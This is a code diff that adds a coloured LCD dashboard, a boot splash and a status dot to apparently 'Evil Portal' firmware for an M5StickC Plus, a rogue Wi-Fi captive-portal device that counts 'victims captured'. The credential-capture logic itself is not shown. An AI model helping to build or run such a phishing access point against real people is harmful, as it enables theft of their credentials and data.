@@ -28,6 +28,18 @@ const int BUILTIN_LED = 10; // M5StickC Plus internal LED (active LOW)
 int blinkRemaining = 0;                    // LED toggles left to perform
 unsigned long lastBlink = 0;               // millis() of last toggle
 const unsigned long BLINK_INTERVAL = 150;  // ms between toggles
+
+// LCD theme (RGB565) + live status-dot state
+#define RGB565(r, g, b) ((uint16_t)(((r & 0xF8) << 8) | ((g & 0xFC) << 3) | ((b) >> 3)))
+#define C_BG      RGB565(15, 17, 21)     // background
+#define C_ACCENT  RGB565(24, 119, 242)   // header bar (blue)
+#define C_ACCENT2 RGB565(120, 170, 255)  // gateway value (light blue)
+#define C_OK      RGB565(48, 163, 108)   // "active" dot
+#define C_OKDIM   RGB565(22, 60, 42)     // "active" dot, off phase
+#define C_MUTED   RGB565(138, 147, 166)  // labels
+#define C_CARD    RGB565(26, 29, 36)     // counter card
+#define C_COUNT   RGB565(255, 196, 0)    // victim count (amber)
+bool dotOn = false;
  
 // Init System Settings
 const byte HTTP_CODE = 200;
@@ -268,14 +280,86 @@ void updateBlink() {
     if (blinkRemaining == 0) digitalWrite(BUILTIN_LED, HIGH); // make sure it ends off
   }
 }
- 
+
+// -------- LCD UI (240x135, rotation 3) --------
+
+// Small "AP active" dot in the top-right of the header bar.
+void drawStatusDot(bool on) {
+  M5.Lcd.fillCircle(228, 13, 5, on ? C_OK : C_OKDIM);
+}
+
+// Animated boot splash: wordmark + a progress bar that fills once.
+void bootScreen() {
+  M5.Lcd.fillScreen(C_BG);
+
+  M5.Lcd.setTextDatum(MC_DATUM);
+  M5.Lcd.setTextSize(3);
+  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
+  M5.Lcd.drawString("PORTAL", 120, 36);
+  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
+  M5.Lcd.drawString("EVIL", 120, 66);
+
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.drawString("HUEBR  -  initializing", 120, 92);
+
+  const int bx = 30, by = 108, bw = 180, bh = 12;
+  M5.Lcd.drawRoundRect(bx, by, bw, bh, 4, C_MUTED);
+  for (int p = 0; p <= 100; p += 2) {
+    int w = (bw - 6) * p / 100;
+    M5.Lcd.fillRoundRect(bx + 3, by + 3, w, bh - 6, 2, C_ACCENT);
+    delay(18);
+  }
+  delay(200);
+}
+
+// Full dashboard repaint: header, SSID, gateway, and the victim-count card.
+void drawMainScreen() {
+  M5.Lcd.fillScreen(C_BG);
+
+  // Header bar
+  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
+  M5.Lcd.setTextDatum(MC_DATUM);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
+  M5.Lcd.drawString("PORTAL EVIL HUEBR", 112, 13);
+  drawStatusDot(true);
+
+  // SSID
+  M5.Lcd.setTextDatum(TL_DATUM);
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.drawString("SSID", 8, 32);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
+  M5.Lcd.drawString(SSID_NAME, 8, 42);
+
+  // Gateway
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_BG);
+  M5.Lcd.drawString("GATEWAY", 8, 62);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
+  M5.Lcd.drawString(APIP.toString(), 8, 72);
+
+  // Victim-count card
+  M5.Lcd.fillRoundRect(3, 92, 234, 40, 8, C_CARD);
+  M5.Lcd.setTextDatum(ML_DATUM);
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED, C_CARD);
+  M5.Lcd.drawString("VICTIMS CAPTURED", 14, 112);
+  M5.Lcd.setTextDatum(MR_DATUM);
+  M5.Lcd.setTextSize(4);
+  M5.Lcd.setTextColor(C_COUNT, C_CARD);
+  M5.Lcd.drawString(String(capcount), 226, 111);
+}
+
 void setup() {
   M5.begin();
   M5.Lcd.setRotation(3);
-  M5.Lcd.fillScreen(BLACK);
-  M5.Lcd.setSwapBytes(true);
-  M5.Lcd.setTextSize(2);
- 
+
+  bootScreen();  // animated splash while things come up
+
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
@@ -303,26 +387,22 @@ void setup() {
   webServer.begin();
   pinMode(BUILTIN_LED, OUTPUT);
   digitalWrite(BUILTIN_LED, HIGH);
+
+  drawMainScreen();     // show the dashboard once the AP is up
+  previous = capcount;  // avoid an immediate redraw on the first loop tick
+  dotOn = true;
 }
  
 void loop() {
   if ((millis() - lastTick) > TICK_TIMER) {
     lastTick = millis();
-    if(capcount > previous){
+    if (capcount != previous) {
       previous = capcount;
- 
-      M5.Lcd.fillScreen(BLACK);
-      M5.Lcd.setSwapBytes(true);
-      M5.Lcd.setTextSize(2);
-      M5.Lcd.setTextColor(TFT_PURPLE, TFT_BLACK);
-      M5.Lcd.setCursor(0, 10);
-      M5.Lcd.print("PORTAL EVIL HUEBR");
-      M5.Lcd.setTextColor(TFT_BLUE, TFT_BLACK);
-      M5.Lcd.setCursor(0, 35);
-      M5.Lcd.print("WiFi IP: ");
-      M5.Lcd.println(APIP);
-      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
-      M5.Lcd.printf("Victim Count: %d\n", capcount);
+      drawMainScreen();   // full repaint with the new count
+      dotOn = true;
+    } else {
+      dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
+      drawStatusDot(dotOn);
     }
   }
   updateBlink();
